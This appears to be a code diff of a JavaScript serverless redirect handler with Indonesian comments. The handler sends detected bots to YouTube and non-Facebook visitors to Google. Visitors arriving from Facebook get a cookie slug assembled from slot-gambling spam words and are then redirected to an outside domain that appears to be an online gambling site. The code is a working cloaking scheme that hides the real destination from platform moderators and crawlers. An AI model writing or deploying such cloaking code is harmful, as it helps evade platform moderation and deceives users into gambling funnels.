@@ -4,9 +4,9 @@ export default async function handler(req, res) {
   const referer = (req.headers["referer"] || "").toLowerCase();
   const url = new URL(req.url, `https://${req.headers.host}`);
   const path = url.pathname;
+  const query = url.search;
 
   const cookies = req.headers.cookie || "";
-  const query = url.search; // 🔥 ambil ?fbclid dll
 
   // ===== DETEKSI =====
   const isBot =
@@ -23,41 +23,51 @@ export default async function handler(req, res) {
   // ===== ROOT =====
   if (path === "/") {
 
-    // BOT → YOUTUBE + query ikut
+    // BOT → YOUTUBE
     if (isBot) {
       return res.writeHead(301, {
         Location: "https://www.youtube.com/" + query
       }).end();
     }
 
-    // NON FB → GOOGLE + query ikut
+    // NON FB → GOOGLE
     if (!isFB) {
       return res.writeHead(301, {
         Location: "https://www.google.com/" + query
       }).end();
     }
 
-    // ===== COOKIE SLUG =====
+    // ===== CEK COOKIE SLUG =====
     let slug = null;
 
     if (cookies.includes("slug=")) {
       slug = cookies.split("slug=")[1].split(";")[0];
     }
 
+    // ===== GENERATE SLUG MANUAL STYLE =====
     if (!slug) {
-      slug = "pusat-" + Math.random().toString(36).substring(2, 10);
+
+      const words = [
+        "pusat","sudah","melakukan","wd","hari","ini",
+        "terbukti","gacor","maxwin","langsung","cair"
+      ];
+
+      slug = words.sort(() => 0.5 - Math.random())
+                  .slice(0, 5)
+                  .join("-") + "-" + Math.floor(Math.random() * 9999);
     }
 
     return res.writeHead(302, {
-      Location: "/" + slug + query, // 🔥 query ikut ke slug juga
+      Location: "/" + slug + query,
       "Set-Cookie": `slug=${slug}; path=/; max-age=86400`
     }).end();
   }
 
   // ===== SLUG =====
   if (path !== "/") {
+
     return res.writeHead(302, {
-      Location: "https://targetlu.com/" + query // 🔥 ikut terus
+      Location: "https://hehehe.pusat4daksi.org/" + query
     }).end();
   }
 }
